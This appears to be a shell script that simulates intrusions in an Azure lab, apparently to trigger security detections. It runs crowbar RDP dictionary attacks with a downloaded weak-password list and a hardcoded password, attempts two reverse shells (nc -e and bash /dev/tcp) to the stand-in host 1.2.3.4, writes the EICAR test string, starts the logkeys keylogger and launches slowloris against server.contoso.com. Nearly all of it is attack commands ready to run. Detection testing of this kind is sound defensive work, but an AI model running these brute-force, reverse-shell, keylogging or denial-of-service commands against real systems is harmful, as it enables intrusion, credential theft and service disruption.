# Download 500 worst passwords dictionary
wget http://downloads.skullsecurity.org/passwords/500-worst-passwords.txt.bz2
bzip2 -d 500-worst-passwords.txt.bz2

# Install crowbar
sudo apt install -y ubuntu-desktop nmap openvpn freerdp-x11 tigervnc-viewer python3 python3-pip

git clone https://github.com/galkan/crowbar
cd crowbar/
pip3 install -r requirements.txt

# Run dictionary attack
./crowbar.py -b rdp -u administrator -C ../500-worst-passwords.txt -s 10.0.0.4/32 -v -D -n1
./crowbar.py -b rdp -u tomas -C ../500-worst-passwords.txt -s 10.0.0.4/32 -v -D -n 1

# Get in to simulate success
./crowbar.py -b rdp -u tomas -c Azure12345678 -s 10.0.0.4/32 -v -D -n 1

# Attempt to create revese shell
nc -e /bin/bash 1.2.3.4 1234 || true 
bash -i>& /dev/tcp/1.2.3.4/1234 0>&1 || true

# Add and remove kernel module
# sudo insmod /lib/modules/5.4.0-1031-azure/kernel/drivers/firewire/nosy.ko 
# sudo rmmod /lib/modules/5.4.0-1031-azure/kernel/drivers/firewire/nosy.ko 

# Store malware file
echo 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > ./EICAR.com

# Run questionable tools
logkeys --start || true
perl slowloris.pl -dns server.contoso.com || true